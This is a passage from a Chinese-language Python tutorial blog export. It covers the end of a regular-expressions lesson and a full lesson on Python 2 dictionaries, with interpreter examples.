<figure class="highlight python"><table><tr><td class="code"><pre><div class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">import</span> re</div><div class="line"><span class="meta">&gt;&gt;&gt; </span>r = <span class="string">r't[^io]p'</span></div><div class="line"><span class="meta">&gt;&gt;&gt; </span>re.findall(r,<span class="string">'top tip ttp tmp t$p'</span>)</div><div class="line">[<span class="string">'ttp'</span>, <span class="string">'tmp'</span>, <span class="string">'t$p'</span>]</div></pre></td></tr></table></figure>
<ul>
<li>^ 匹配行的开始</li>
</ul>
<p>　　匹配行首除非设置 MULTILINE 标志，它只是匹配字符串的开始。在 MULTILINE 模式里，它也可以直接匹配字符串中的每个换行。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><div class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">import</span> re</div><div class="line"><span class="meta">&gt;&gt;&gt; </span>r = <span class="string">r'^hi'</span></div><div class="line"><span class="meta">&gt;&gt;&gt; </span>re.findall(r,<span class="string">'hi, how are you? hi what are you doing?'</span>)</div><div class="line">[<span class="string">'hi'</span>]</div><div class="line"><span class="meta">&gt;&gt;&gt; </span>re.findall(r,<span class="string">'how are you? hi what are you doing?'</span>)</div><div class="line">[]</div></pre></td></tr></table></figure>
<ul>
<li><code>$</code> 匹配行的结束</li>
</ul>
<p>　　匹配行尾，行尾被定义为要么是字符串尾，要么是一个换行字符后面的任何位置。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><div class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">import</span> re</div><div class="line"><span class="meta">&gt;&gt;&gt; </span>r = <span class="string">r'you$'</span></div><div class="line"><span class="meta">&gt;&gt;&gt; </span>re.findall(r,<span class="string">'how are you'</span>)</div><div class="line">[<span class="string">'you'</span>]</div><div class="line"><span class="meta">&gt;&gt;&gt; </span>re.findall(r,<span class="string">'how are'</span>)</div><div class="line">[]</div></pre></td></tr></table></figure>
<ul>
<li><code>\</code> 将下一字符标记为特殊字符、愿意字符、反向引用或八进制转义符。</li>
</ul>
<p>　　反斜线后面可以接不同的字符以表示不同特殊意义，也可以用于取消所有元字符。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><div class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">import</span> re</div><div class="line"><span class="meta">&gt;&gt;&gt; </span>r = <span class="string">r"\n"</span></div><div class="line"><span class="meta">&gt;&gt;&gt; </span>re.findall(r,<span class="string">'abc\n'</span>)</div><div class="line">[<span class="string">'\n'</span>]</div><div class="line"><span class="meta">&gt;&gt;&gt; </span>re.findall(r,<span class="string">'abc\\n'</span>)</div><div class="line">[]</div></pre></td></tr></table></figure>
<ul>
<li><code>|</code> 指示在两个或多个项之间进行选择。</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><div class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">import</span> re</div><div class="line"><span class="meta">&gt;&gt;&gt; </span>r = <span class="string">r"ab|ac"</span></div><div class="line"><span class="meta">&gt;&gt;&gt; </span>re.findall(r,<span class="string">'abacad'</span>)</div><div class="line">[<span class="string">'ab'</span>, <span class="string">'ac'</span>]</div></pre></td></tr></table></figure>
<h5 id="预定义字符集"><a href="#预定义字符集" class="headerlink" title="预定义字符集"></a>预定义字符集</h5><ul>
<li><p><code>\d</code> 匹配任何十进制数，相当于 <code>[0-9]</code></p>
</li>
<li><p><code>\D</code> 匹配任何非数字字符，相当于 <code>[^0-9]</code></p>
</li>
<li><p><code>\s</code> 匹配任何空白字符，相当于 <code>[\t\n\r\f\v]</code></p>
</li>
<li><p><code>\S</code> 匹配任何非空白字符，相当于 <code>[^\t\n\r\f\v]</code></p>
</li>
<li><p><code>\w</code> 匹配任何字母数字字符，相当于 <code>[a-zA-Z0-9]</code></p>
</li>
<li><p><code>\W</code> 匹配任何非字母数字字符，相当于 <code>[^a-zA-Z0-9]</code></p>
</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><div class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">import</span> re</div><div class="line"><span class="meta">&gt;&gt;&gt; </span>r = <span class="string">r"[0-9]"</span></div><div class="line"><span class="meta">&gt;&gt;&gt; </span>re.findall(r,<span class="string">'12ab34cd .;-!'</span>)</div><div class="line">[<span class="string">'1'</span>, <span class="string">'2'</span>, <span class="string">'3'</span>, <span class="string">'4'</span>]</div><div class="line"><span class="meta">&gt;&gt;&gt; </span>r = <span class="string">r"\d"</span></div><div class="line"><span class="meta">&gt;&gt;&gt; </span>re.findall(r,<span class="string">'12ab34cd .;-!'</span>)</div><div class="line">[<span class="string">'1'</span>, <span class="string">'2'</span>, <span class="string">'3'</span>, <span class="string">'4'</span>]</div><div class="line"><span class="meta">&gt;&gt;&gt; </span>r = <span class="string">r"\D"</span></div><div class="line"><span class="meta">&gt;&gt;&gt; </span>re.findall(r,<span class="string">'12ab34cd .;-!'</span>)</div><div class="line">[<span class="string">'a'</span>, <span class="string">'b'</span>, <span class="string">'c'</span>, <span class="string">'d'</span>, <span class="string">' '</span>, <span class="string">'.'</span>, <span class="string">';'</span>, <span class="string">'-'</span>, <span class="string">'!'</span>]</div><div class="line"><span class="meta">&gt;&gt;&gt; </span>r = <span class="string">r"\s"</span></div><div class="line"><span class="meta">&gt;&gt;&gt; </span>re.findall(r,<span class="string">'12ab34cd .;-!'</span>)</div><div class="line">[<span class="string">' '</span>]</div><div class="line"><span class="meta">&gt;&gt;&gt; </span>r = <span class="string">r"\S"</span></div><div class="line"><span class="meta">&gt;&gt;&gt; </span>re.findall(r,<span class="string">'12ab34cd .;-!'</span>)</div><div class="line">[<span class="string">'1'</span>, <span class="string">'2'</span>, <span class="string">'a'</span>, <span class="string">'b'</span>, <span class="string">'3'</span>, <span class="string">'4'</span>, <span class="string">'c'</span>, <span class="string">'d'</span>, <span class="string">'.'</span>, <span class="string">';'</span>, <span class="string">'-'</span>, <span class="string">'!'</span>]</div><div class="line"><span class="meta">&gt;&gt;&gt; </span>r = <span class="string">r"\w"</span></div><div class="line"><span class="meta">&gt;&gt;&gt; </span>re.findall(r,<span class="string">'12ab34cd .;-!'</span>)</div><div class="line">[<span class="string">'1'</span>, <span class="string">'2'</span>, <span class="string">'a'</span>, <span class="string">'b'</span>, <span class="string">'3'</span>, <span class="string">'4'</span>, <span class="string">'c'</span>, <span class="string">'d'</span>]</div><div class="line"><span class="meta">&gt;&gt;&gt; </span>r = <span class="string">r"\W"</span></div><div class="line"><span class="meta">&gt;&gt;&gt; </span>re.findall(r,<span class="string">'12ab34cd .;-!'</span>)</div><div class="line">[<span class="string">' '</span>, <span class="string">'.'</span>, <span class="string">';'</span>, <span class="string">'-'</span>, <span class="string">'!'</span>]</div></pre></td></tr></table></figure>
<h5 id="常用重复限定符"><a href="#常用重复限定符" class="headerlink" title="常用重复限定符"></a>常用重复限定符</h5><ul>
<li><ul>
<li>字符</li>
</ul>
</li>
</ul>
<p>　　表示前一个字符可以被匹配零次或者任意多次，而不是只有一次。匹配引擎会试着重复尽可能多的次数。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><div class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">import</span> re</div><div class="line"><span class="meta">&gt;&gt;&gt; </span>r = <span class="string">r"ab*"</span></div><div class="line"><span class="meta">&gt;&gt;&gt; </span>re.findall(r,<span class="string">'a'</span>)</div><div class="line">[<span class="string">'a'</span>]</div><div class="line"><span class="meta">&gt;&gt;&gt; </span>re.findall(r,<span class="string">'ab'</span>)</div><div class="line">[<span class="string">'ab'</span>]</div><div class="line"><span class="meta">&gt;&gt;&gt; </span>re.findall(r,<span class="string">'abb'</span>)</div><div class="line">[<span class="string">'abb'</span>]</div></pre></td></tr></table></figure>
<ul>
<li><ul>
<li>字符</li>
</ul>
</li>
</ul>
<p>　　表示前一个字符可以被匹配一次或任意多次。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><div class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">import</span> re</div><div class="line"><span class="meta">&gt;&gt;&gt; </span>r = <span class="string">r"ab+"</span></div><div class="line"><span class="meta">&gt;&gt;&gt; </span>re.findall(r,<span class="string">'a'</span>)</div><div class="line">[]</div><div class="line"><span class="meta">&gt;&gt;&gt; </span>re.findall(r,<span class="string">'ab'</span>)</div><div class="line">[<span class="string">'ab'</span>]</div><div class="line"><span class="meta">&gt;&gt;&gt; </span>re.findall(r,<span class="string">'abb'</span>)</div><div class="line">[<span class="string">'abb'</span>]</div></pre></td></tr></table></figure>
<p><strong>注意：</strong></p>
<p>　　<code>*</code> 与 <code>+</code> 之间的不同：<code>*</code> 匹配零次或任意多次，所以可以根本就不出现，但是 <code>+</code> 则要求至少出现一次。<code>?</code> 字符表示前一个字符可以被匹配一次或零次：可以认为它用于标识某事物是可选的。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><div class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">import</span> re</div><div class="line"><span class="meta">&gt;&gt;&gt; </span>r = <span class="string">r"ab?"</span></div><div class="line"><span class="meta">&gt;&gt;&gt; </span>re.findall(r,<span class="string">'a'</span>)</div><div class="line">[<span class="string">'a'</span>]</div><div class="line"><span class="meta">&gt;&gt;&gt; </span>re.findall(r,<span class="string">'ab'</span>)</div><div class="line">[<span class="string">'ab'</span>]</div><div class="line"><span class="meta">&gt;&gt;&gt; </span>re.findall(r,<span class="string">'abb'</span>)</div><div class="line">[<span class="string">'ab'</span>]</div></pre></td></tr></table></figure>
<p><strong>贪婪模式与非贪婪模式：</strong></p>
<p>　　贪婪匹配：正则表达式一般趋向于最大长度匹配，也就是所谓的贪婪匹配。</p>
<p>　　非贪婪匹配：就是匹配到结果就好，最少的匹配字符。</p>
<p>　　默认是贪婪模式；在量词后面直接加上一个问号 <code>？</code> 就是非贪婪模式。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><div class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">import</span> re</div><div class="line"><span class="meta">&gt;&gt;&gt; </span>r = <span class="string">r"ab+"</span></div><div class="line"><span class="meta">&gt;&gt;&gt; </span>re.findall(r,<span class="string">'ab'</span>)</div><div class="line">[<span class="string">'ab'</span>]</div><div class="line"><span class="meta">&gt;&gt;&gt; </span>re.findall(r,<span class="string">'abbb'</span>)</div><div class="line">[<span class="string">'abbb'</span>]</div><div class="line"><span class="meta">&gt;&gt;&gt; </span>r = <span class="string">r"ab+?"</span></div><div class="line"><span class="meta">&gt;&gt;&gt; </span>re.findall(r,<span class="string">'ab'</span>)</div><div class="line">[<span class="string">'ab'</span>]</div><div class="line"><span class="meta">&gt;&gt;&gt; </span>re.findall(r,<span class="string">'abbb'</span>)</div><div class="line">[<span class="string">'ab'</span>]</div></pre></td></tr></table></figure>
<ul>
<li><code>{m, n}</code> 限定范围</li>
</ul>
<p>　　其中 m 和 n 是十进制整数。该限定符的意思是至少有 m 个重复，至多到 n 个重复。忽略 m 会认为下边界是0，而忽略n的结果将是上边界为无穷大。<code>{0,}</code> 等同于 <code>*</code>，<code>{1,}</code> 等同于 <code>+</code> ，而 <code>{0,1}</code> 则与 <code>?</code> 相同。如果可以的话，最好用 <code>*</code> , <code>+</code> 或 <code>?</code> 。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><div class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">import</span> re</div><div class="line"><span class="meta">&gt;&gt;&gt; </span>r = <span class="string">r"a&#123;1,3&#125;"</span></div><div class="line"><span class="meta">&gt;&gt;&gt; </span>re.findall(r,<span class="string">'a'</span>)</div><div class="line">[<span class="string">'a'</span>]</div><div class="line"><span class="meta">&gt;&gt;&gt; </span>re.findall(r,<span class="string">'aa'</span>)</div><div class="line">[<span class="string">'aa'</span>]</div><div class="line"><span class="meta">&gt;&gt;&gt; </span>re.findall(r,<span class="string">'aaa'</span>)</div><div class="line">[<span class="string">'aaa'</span>]</div><div class="line"><span class="meta">&gt;&gt;&gt; </span>re.findall(r,<span class="string">'aaaa'</span>)</div><div class="line">[<span class="string">'aaa'</span>, <span class="string">'a'</span>]</div><div class="line"><span class="meta">&gt;&gt;&gt; </span>re.findall(r,<span class="string">'ab'</span>)</div><div class="line">[<span class="string">'a'</span>]</div><div class="line"><span class="meta">&gt;&gt;&gt; </span>re.findall(r,<span class="string">'b'</span>)</div><div class="line">[]</div><div class="line"><span class="meta">&gt;&gt;&gt; </span>r = <span class="string">r"a&#123;0,&#125;"</span></div><div class="line"><span class="meta">&gt;&gt;&gt; </span>re.findall(r,<span class="string">'aaaaa'</span>)</div><div class="line">[<span class="string">'aaaaa'</span>, <span class="string">''</span>]</div><div class="line"><span class="meta">&gt;&gt;&gt; </span>r = <span class="string">r"a&#123;1,&#125;"</span></div><div class="line"><span class="meta">&gt;&gt;&gt; </span>re.findall(r,<span class="string">'aaaaa'</span>)</div><div class="line">[<span class="string">'aaaaa'</span>]</div><div class="line"><span class="meta">&gt;&gt;&gt; </span>r = <span class="string">r"a&#123;0,1&#125;"</span></div><div class="line"><span class="meta">&gt;&gt;&gt; </span>re.findall(r,<span class="string">'aaaaa'</span>)</div><div class="line">[<span class="string">'a'</span>, <span class="string">'a'</span>, <span class="string">'a'</span>, <span class="string">'a'</span>, <span class="string">'a'</span>, <span class="string">''</span>]</div></pre></td></tr></table></figure>
<h4 id="特殊应用"><a href="#特殊应用" class="headerlink" title="特殊应用"></a>特殊应用</h4><h5 id="忽略大小写"><a href="#忽略大小写" class="headerlink" title="忽略大小写"></a>忽略大小写</h5><p>　　<code>(?i)</code> 用于忽略大小写匹配。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><div class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">import</span> re</div><div class="line"><span class="meta">&gt;&gt;&gt; </span>r = <span class="string">r"(?i)ab"</span></div><div class="line"><span class="meta">&gt;&gt;&gt; </span>re.findall(r,<span class="string">'AbABabcd'</span>)</div><div class="line">[<span class="string">'Ab'</span>, <span class="string">'AB'</span>, <span class="string">'ab'</span>]</div></pre></td></tr></table></figure>
<h5 id="单词分界符"><a href="#单词分界符" class="headerlink" title="单词分界符"></a>单词分界符</h5><p>　　<code>\b</code> 表示单词分界符。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><div class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">import</span> re</div><div class="line"><span class="meta">&gt;&gt;&gt; </span>r = <span class="string">r"\bhi\b"</span></div><div class="line"><span class="meta">&gt;&gt;&gt; </span>re.findall(r,<span class="string">'his him hi history'</span>)</div><div class="line">[<span class="string">'hi'</span>]</div></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>Coding</category>
        <category>Python</category>
      </categories>
      <tags>
        <tag>Python</tag>
        <tag>正则表达式</tag>
      </tags>
  </entry>
  <entry>
    <title>Python 基础详解 - 字典</title>
    <url>/2017/01/13/Python%20%E5%9F%BA%E7%A1%80%E8%AF%A6%E8%A7%A3%20-%20%E5%AD%97%E5%85%B8/</url>
    <content><![CDATA[<p>　　字典是 Python 中唯一内建的映射类型（哈希表）。字典中的值并没有特殊的顺序，但是都存储在一个特定的键下。键可以是数字、字符串甚至是元组。</p>
<p>　　字典中的键是唯一的，但值并不唯一。</p>
<a id="more"></a>
<p>　　字典对象是可变的，但是字典的键必须使用不可变对象，并且一个字典中可以使用不同类型的键值。</p>
<h4 id="创建字典"><a href="#创建字典" class="headerlink" title="创建字典"></a>创建字典</h4><h5 id="使用-创建"><a href="#使用-创建" class="headerlink" title="使用 {} 创建"></a>使用 {} 创建</h5><figure class="highlight python"><table><tr><td class="code"><pre><div class="line"><span class="meta">&gt;&gt;&gt; </span>d = &#123;<span class="string">'name'</span>:<span class="string">'fzy'</span>,<span class="string">'age'</span>:<span class="string">'22'</span>,<span class="string">'class'</span>:<span class="string">'13-3'</span>&#125;</div><div class="line"><span class="meta">&gt;&gt;&gt; </span>d</div><div class="line">&#123;<span class="string">'age'</span>: <span class="string">'22'</span>, <span class="string">'name'</span>: <span class="string">'fzy'</span>, <span class="string">'class'</span>: <span class="string">'13-3'</span>&#125;</div></pre></td></tr></table></figure>
<h5 id="工厂方法-dict"><a href="#工厂方法-dict" class="headerlink" title="工厂方法 dict()"></a>工厂方法 dict()</h5><figure class="highlight python"><table><tr><td class="code"><pre><div class="line"><span class="meta">&gt;&gt;&gt; </span>items = [(<span class="string">'name'</span>,<span class="string">'fzy'</span>),(<span class="string">'age'</span>,<span class="string">'22'</span>),(<span class="string">'class'</span>,<span class="string">'13-3'</span>)]</div><div class="line"><span class="meta">&gt;&gt;&gt; </span>d = dict(items)</div><div class="line"><span class="meta">&gt;&gt;&gt; </span>d</div><div class="line">&#123;<span class="string">'age'</span>: <span class="string">'22'</span>, <span class="string">'name'</span>: <span class="string">'fzy'</span>, <span class="string">'class'</span>: <span class="string">'13-3'</span>&#125;</div></pre></td></tr></table></figure>
<p>　　dict 函数也可以通过关键字参数来创建字典。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><div class="line"><span class="meta">&gt;&gt;&gt; </span>d = dict(name=<span class="string">'fzy'</span>,age=<span class="string">'22'</span>)</div><div class="line"><span class="meta">&gt;&gt;&gt; </span>d</div><div class="line">&#123;<span class="string">'age'</span>: <span class="string">'22'</span>, <span class="string">'name'</span>: <span class="string">'fzy'</span>&#125;</div></pre></td></tr></table></figure>
<h5 id="内建方法-fromkeys"><a href="#内建方法-fromkeys" class="headerlink" title="内建方法 fromkeys()"></a>内建方法 fromkeys()</h5><p>　　创建’默认‘字典，字典中元素具有相同的 value，如果没有给出，默认为 None。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><div class="line"><span class="meta">&gt;&gt;&gt; </span>&#123;&#125;.fromkeys((<span class="string">'x'</span>,<span class="string">'y'</span>),<span class="number">-1</span>)</div><div class="line">&#123;<span class="string">'y'</span>: <span class="number">-1</span>, <span class="string">'x'</span>: <span class="number">-1</span>&#125;</div></pre></td></tr></table></figure>
<h4 id="基本字典操作"><a href="#基本字典操作" class="headerlink" title="基本字典操作"></a>基本字典操作</h4><h5 id="自动添加"><a href="#自动添加" class="headerlink" title="自动添加"></a>自动添加</h5><p>　　d[key]=values 将值 values 关联到键 key 上。即使键起初在字典中并不存在，也可以为其赋值，会建立新的项。</p>
<h5 id="访问字典中的值"><a href="#访问字典中的值" class="headerlink" title="访问字典中的值"></a>访问字典中的值</h5><p>　　d[key] 返回关联到键 key 上的值。</p>
<h5 id="判断成员资格"><a href="#判断成员资格" class="headerlink" title="判断成员资格"></a>判断成员资格</h5><p>　　直接使用 key 访问：key 不存在会报错，可以使用 had_key() 或者 in 和 not in 判断。</p>
<h5 id="len-操作"><a href="#len-操作" class="headerlink" title="len 操作"></a>len 操作</h5><p>　　len(dict) 返回 dict 中键值对的数量。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><div class="line"><span class="meta">&gt;&gt;&gt; </span>d = &#123;<span class="string">'name'</span>:<span class="string">'fzy'</span>,<span class="string">'age'</span>:<span class="string">'22'</span>,<span class="string">'class'</span>:<span class="string">'13-3'</span>&#125;</div><div class="line"><span class="meta">&gt;&gt;&gt; </span>len(d)</div><div class="line"><span class="number">3</span></div></pre></td></tr></table></figure>
<h5 id="del-操作"><a href="#del-操作" class="headerlink" title="del 操作"></a>del 操作</h5><p>　　del d[key] 删除字典 d 中键值为 key 的元素，也可以使用 del 删除整个字典。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><div class="line"><span class="meta">&gt;&gt;&gt; </span>d = &#123;<span class="string">'name'</span>:<span class="string">'fzy'</span>,<span class="string">'age'</span>:<span class="string">'22'</span>,<span class="string">'class'</span>:<span class="string">'13-3'</span>&#125;</div><div class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">del</span> d[<span class="string">'class'</span>]</div><div class="line"><span class="meta">&gt;&gt;&gt; </span>d</div><div class="line">&#123;<span class="string">'age'</span>: <span class="string">'22'</span>, <span class="string">'name'</span>: <span class="string">'fzy'</span>&#125;</div><div class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">del</span> d</div><div class="line"><span class="meta">&gt;&gt;&gt; </span>d</div><div class="line">Traceback (most recent call last):</div><div class="line">  File <span class="string">"&lt;stdin&gt;"</span>, line <span class="number">1</span>, <span class="keyword">in</span> &lt;module&gt;</div><div class="line">NameError: name <span class="string">'d'</span> <span class="keyword">is</span> <span class="keyword">not</span> defined</div></pre></td></tr></table></figure>
<h5 id="遍历字典"><a href="#遍历字典" class="headerlink" title="遍历字典"></a>遍历字典</h5><p>　　方法一：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><div class="line"><span class="meta">&gt;&gt;&gt; </span>d = &#123;<span class="string">'name'</span>:<span class="string">'fzy'</span>, <span class="string">'age'</span>:<span class="string">'22'</span>, <span class="string">'class'</span>:<span class="string">'13-3'</span>&#125;</div><div class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">for</span> key <span class="keyword">in</span> d:</div><div class="line"><span class="meta">... </span>    <span class="keyword">print</span> key,d[key]</div><div class="line">...</div><div class="line">age <span class="number">22</span></div><div class="line">name fzy</div><div class="line"><span class="class"><span class="keyword">class</span> 13-3</span></div></pre></td></tr></table></figure>
<p>　　方法二：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><div class="line"><span class="meta">&gt;&gt;&gt; </span>d = &#123;<span class="string">'name'</span>:<span class="string">'fzy'</span>, <span class="string">'age'</span>:<span class="string">'22'</span>, <span class="string">'class'</span>:<span class="string">'13-3'</span>&#125;</div><div class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">for</span> key,value <span class="keyword">in</span> d.items():</div><div class="line"><span class="meta">... </span>    <span class="keyword">print</span> key,value</div><div class="line">...</div><div class="line">age <span class="number">22</span></div><div class="line">name fzy</div><div class="line"><span class="class"><span class="keyword">class</span> 13-3</span></div></pre></td></tr></table></figure>
<h4 id="字典方法"><a href="#字典方法" class="headerlink" title="字典方法"></a>字典方法</h4><h5 id="clear-方法"><a href="#clear-方法" class="headerlink" title="clear() 方法"></a>clear() 方法</h5><p>　　clear() 方法清除字典中所有的项。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><div class="line"><span class="meta">&gt;&gt;&gt; </span>d = &#123;<span class="string">'name'</span>:<span class="string">'fzy'</span>,<span class="string">'age'</span>:<span class="string">'22'</span>,<span class="string">'class'</span>:<span class="string">'13-3'</span>&#125;</div><div class="line"><span class="meta">&gt;&gt;&gt; </span>d.clear()</div><div class="line"><span class="meta">&gt;&gt;&gt; </span>d</div><div class="line">&#123;&#125;</div></pre></td></tr></table></figure>
<h5 id="copy-方法"><a href="#copy-方法" class="headerlink" title="copy() 方法"></a>copy() 方法</h5><p>　　copy() 方法返回一个具有相同键值对的新字典。在复制的时候，使用的是浅拷贝，复制了对象，但是对象中的元素，依然使用引用。</p>
<p>　　<strong>浅拷贝与深拷贝：</strong></p>
<p>　　浅拷贝：没有拷贝子对象，所以原始数据改变，子对象会改变</p>
<p>　　深拷贝：包含对象里面的自对象的拷贝，所以原始对象的改变不会造成深拷贝里任何子元素的改变</p>
<figure class="highlight python"><table><tr><td class="code"><pre><div class="line"><span class="meta">&gt;&gt;&gt; </span>d = &#123;<span class="string">'name'</span>:<span class="string">'fzy'</span>,<span class="string">'age'</span>:<span class="string">'22'</span>,<span class="string">'course'</span>:[<span class="string">'python'</span>,<span class="string">'java'</span>,<span class="string">'c++'</span>]&#125;</div><div class="line"><span class="meta">&gt;&gt;&gt; </span>c = d.copy()</div><div class="line"><span class="meta">&gt;&gt;&gt; </span>c[<span class="string">'name'</span>] = <span class="string">'xxx'</span></div><div class="line"><span class="meta">&gt;&gt;&gt; </span>c[<span class="string">'course'</span>].remove(<span class="string">'c++'</span>)</div><div class="line"><span class="meta">&gt;&gt;&gt; </span>c</div><div class="line">&#123;<span class="string">'course'</span>: [<span class="string">'python'</span>, <span class="string">'java'</span>], <span class="string">'age'</span>: <span class="string">'22'</span>, <span class="string">'name'</span>: <span class="string">'xxx'</span>&#125;</div><div class="line"><span class="meta">&gt;&gt;&gt; </span>d</div><div class="line">&#123;<span class="string">'course'</span>: [<span class="string">'python'</span>, <span class="string">'java'</span>], <span class="string">'age'</span>: <span class="string">'22'</span>, <span class="string">'name'</span>: <span class="string">'fzy'</span>&#125;</div></pre></td></tr></table></figure>
<p>　　当副本中替换值时，原字典不受影响，但是，如果修改了某个值，原字典也会改变。避免这个问题的一种方法就是使用深复制，复制其包含的所有值。（可以使用 copy 模块的 deepcopy 函数来实现）</p>
<h5 id="items-和-iteritems-方法"><a href="#items-和-iteritems-方法" class="headerlink" title="items() 和 iteritems() 方法"></a>items() 和 iteritems() 方法</h5><p>　　items() 方法将字典所有的项以列表方式返回。列表的每一项都表示为键值对的形式，但是项再返回时没有特定的次序。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><div class="line"><span class="meta">&gt;&gt;&gt; </span>d = &#123;<span class="string">'name'</span>:<span class="string">'fzy'</span>,<span class="string">'age'</span>:<span class="string">'22'</span>,<span class="string">'class'</span>:<span class="string">'13-3'</span>&#125;</div><div class="line"><span class="meta">&gt;&gt;&gt; </span>d.items()</div><div class="line">[(<span class="string">'age'</span>, <span class="string">'22'</span>), (<span class="string">'name'</span>, <span class="string">'fzy'</span>), (<span class="string">'class'</span>, <span class="string">'13-3'</span>)]</div></pre></td></tr></table></figure>
<p>　　iteritems() 方法与 items() 方法类似，但是会返回一个迭代器对象而不是列表。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><div class="line"><span class="meta">&gt;&gt;&gt; </span>it = d.iteritems()</div><div class="line"><span class="meta">&gt;&gt;&gt; </span>it</div><div class="line">&lt;dictionary-itemiterator object at <span class="number">0x02AFF750</span>&gt;</div><div class="line"><span class="meta">&gt;&gt;&gt; </span>list(it)    <span class="comment">#把迭代对象转换成列表</span></div><div class="line">[(<span class="string">'age'</span>, <span class="string">'22'</span>), (<span class="string">'name'</span>, <span class="string">'fzy'</span>), (<span class="string">'class'</span>, <span class="string">'13-3'</span>)]</div></pre></td></tr></table></figure>
<h5 id="keys-和-iterkeys-方法"><a href="#keys-和-iterkeys-方法" class="headerlink" title="keys() 和 iterkeys() 方法"></a>keys() 和 iterkeys() 方法</h5><p>　　keys() 方法返回字典中键的列表，而 iterkeys() 方法返回字典中键的迭代器。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><div class="line"><span class="meta">&gt;&gt;&gt; </span>d = &#123;<span class="string">'name'</span>:<span class="string">'fzy'</span>,<span class="string">'age'</span>:<span class="string">'22'</span>,<span class="string">'class'</span>:<span class="string">'13-3'</span>&#125;</div><div class="line"><span class="meta">&gt;&gt;&gt; </span>d.keys()</div><div class="line">[<span class="string">'age'</span>, <span class="string">'name'</span>, <span class="string">'class'</span>]</div><div class="line"><span class="meta">&gt;&gt;&gt; </span>it = d.iterkeys()</div><div class="line"><span class="meta">&gt;&gt;&gt; </span>it</div><div class="line">&lt;dictionary-keyiterator object at <span class="number">0x02AFFB40</span>&gt;</div><div class="line"><span class="meta">&gt;&gt;&gt; </span>list(it)     <span class="comment">#把迭代对象转换成列表</span></div><div class="line">[<span class="string">'age'</span>, <span class="string">'name'</span>, <span class="string">'class'</span>]</div></pre></td></tr></table></figure>
<h5 id="values-和-itervalues-方法"><a href="#values-和-itervalues-方法" class="headerlink" title="values() 和 itervalues() 方法"></a>values() 和 itervalues() 方法</h5><p>　　values() 方法返回字典中所有值的列表，而 itervalues() 方法返回值的迭代器。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><div class="line"><span class="meta">&gt;&gt;&gt; </span>d = &#123;<span class="string">'name'</span>:<span class="string">'fzy'</span>,<span class="string">'age'</span>:<span class="string">'22'</span>,<span class="string">'class'</span>:<span class="string">'13-3'</span>&#125;</div><div class="line"><span class="meta">&gt;&gt;&gt; </span>d.values()</div><div class="line">[<span class="string">'22'</span>, <span class="string">'fzy'</span>, <span class="string">'13-3'</span>]</div><div class="line"><span class="meta">&gt;&gt;&gt; </span>it = d.itervalues()</div><div class="line"><span class="meta">&gt;&gt;&gt; </span>it</div><div class="line">&lt;dictionary-valueiterator object at <span class="number">0x02AFF8A0</span>&gt;</div><div class="line"><span class="meta">&gt;&gt;&gt; </span>list(it)    <span class="comment">#把迭代对象转换成列表</span></div><div class="line">[<span class="string">'22'</span>, <span class="string">'fzy'</span>, <span class="string">'13-3'</span>]</div></pre></td></tr></table></figure>
<h5 id="has-key-方法"><a href="#has-key-方法" class="headerlink" title="has_key() 方法"></a>has_key() 方法</h5><p>　　has_key(key) 判断字典中是否存在 key，Python3.0 中不包括这个函数，建议使用 in 和 not in 代替。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">&gt;&gt;&gt; d = &#123; &#125;</div><div class="line">&gt;&gt;&gt; d.has_key(&apos;name&apos;)</div><div class="line">False</div><div class="line">&gt;&gt;&gt; d[&apos;name&apos;] = &apos;fzy&apos;</div><div class="line">&gt;&gt;&gt; d.has_key(&apos;name&apos;)</div><div class="line">True</div></pre></td></tr></table></figure>
<h5 id="fromkeys-方法"><a href="#fromkeys-方法" class="headerlink" title="fromkeys() 方法"></a>fromkeys() 方法</h5><p>　　fromkeys(seq,val=None) 方法以 seq 中的元素为键创建并返回一个字典，val 为指定的默认值。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">&gt;&gt;&gt; &#123;&#125;.fromkeys((&apos;x&apos;,&apos;y&apos;),-1)</div><div class="line">&#123;&apos;y&apos;: -1, &apos;x&apos;: -1&#125;</div></pre></td></tr></table></figure>
